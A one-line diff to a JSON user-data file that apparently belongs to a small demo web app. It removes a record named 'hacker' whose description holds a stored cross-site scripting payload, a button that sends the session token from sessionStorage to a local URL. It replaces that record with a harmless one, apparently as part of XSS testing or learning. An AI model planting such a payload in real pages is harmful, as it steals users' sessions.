@@ -1,1 +1,1 @@
-{"users":[],"data":[{"username":"admin","description":"welcome to my page. <strong> click here </strong>"},{"username":"hacker","description":"    <button onclick=\"document.location.replace('http://www.localhost:5000/sessionId:' + sessionStorage.getItem('session'))\">click me </button>\n"}]}
+{"users":[],"data":[{"username":"hacker1","description":"Button"}]}
